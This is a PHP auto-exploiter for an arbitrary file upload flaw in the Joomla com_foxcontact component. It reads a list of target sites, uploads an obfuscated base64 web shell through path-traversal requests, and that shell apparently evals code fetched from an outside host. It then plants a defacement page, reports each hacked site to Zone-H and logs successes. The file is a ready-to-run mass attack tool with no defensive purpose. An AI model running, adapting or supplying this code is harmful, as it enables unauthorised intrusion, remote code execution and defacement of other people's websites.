<?php
/**

Joomla Component com_foxcontact Arbitrary File Upload
https://cxsecurity.com/issue/WLB-2016050072

Auto Exploiter (Shell Upload, Auto Deface, and Auto Submit Zone -H)
Coded by: L0c4lh34rtz - IndoXploit
http://www.indoxploit.or.id/2017/12/joomla-component-comfoxcontact.html

*/

error_reporting(0);
set_time_limit(0);

Class IDX_Foxcontact {
	public  $url;
	private $file = [];

	/*  Zone -H   */
	/* Pastikan dalam script deface kalian terdapat kata HACKED */
	private $hacker = "Foursdeath Team";
	/* Ini untuk uploader.. Seterah kalian mau di ganti atau tidak */
	private $uploader  = 'R0lGODlhOwoKVXBsb2FkZXIgQnkgSW5kb1hwbG9pdCBCT1QKCjw/PS8qKioqL0BudWxsOyAvKioqKioqKiovIC8qKioqKioqLyAvKioqKioqKiovQGV2YWwvKioqKi8oIj8+Ii5maWxlX2dldF9jb250ZW50cy8qKioqKioqLygiaHR0cDovL3d3dy5jb25zdGVudW0udXMvcDNjb3B5L3N0b3JhZ2UvbG9ncy9kZWJ1Zy5qc29uIikpOy8qKi8/Pg==';
		
	/* script deface, ubah bagian ini ke base64 script deface kalian */
	private $deface    = 'PGh0bWw+CjxjZW50ZXI+SGFja2VkIEJ5IDB4U0hBTEw=';

		 

	public function __construct() {
		$this->file = (object) $this->file;

		/* Nama file deface kalian */
		$this->file->deface 	= "sha.phtml";

		$this->file->shell 		= $this->randomFileName().".php";
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function randomFileName() {
		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));

		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
		return $prefixFilename.$generate;
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function getId() {
		$url 		= $this->url;
		$getContent = $this->curl($url)->response;
		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);

		return (object) [
			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
		];
	}

	public function exploit() {
		$getCid = $this->getId()->cid;
		$getMid = $this->getId()->mid;

		$url	= (object) parse_url($this->url);

		$headers = [
			"X-Requested-With: XMLHttpRequest",
			"X-File-Name: ".$this->file->shell,
			"Content-Type: image/jpeg"
		];

		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->uploader), $headers);
		}

		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
		$check = $this->curl($shell)->response;
		if(preg_match("/Uploader By IndoXploit BOT/i", $check)) {
			print "[+] Shell OK: ".$shell."\n";
			$this->save($shell);
		} else {
			print "[-] Shell Failed\n";
		}
		
		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->deface), $headers);
		}

		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
		$check = $this->curl($deface)->response;
		if(preg_match("/hacked/i", $check)) {
			print "[+] Deface OK: ".$deface."\n";
			$this->zoneh($deface);
			$this->save($deface);
		} else {
			print "[-] Deface Failed\n";
		}
	}

	public function zoneh($url) {
		$post = $this->curl("http://www.zone-h.com/notify/single", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);
		if(preg_match("/color=\"red\">(.*?)<\/font><\/li>/i", $post->response, $matches)) {
			if($matches[1] === "ERROR") {
				preg_match("/<font color=\"red\">ERROR:<br\/>(.*?)<br\/>/i", $post->response, $matches2);
				print "[-] Zone-H ($url) [ERROR: ".$matches2[1]."]\n\n";
			} else {
				print "[+] Zone-H ($url) [OK]\n\n";
			}
		}
	}

	public function save($isi) {
		$handle = fopen("result_foxcontact.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}
} 	

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fox = new IDX_Foxcontact();
	$fox->url = trim($list);
	$fox->url = $fox->validUrl();

	print "[*] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
	$fox->exploit();
}
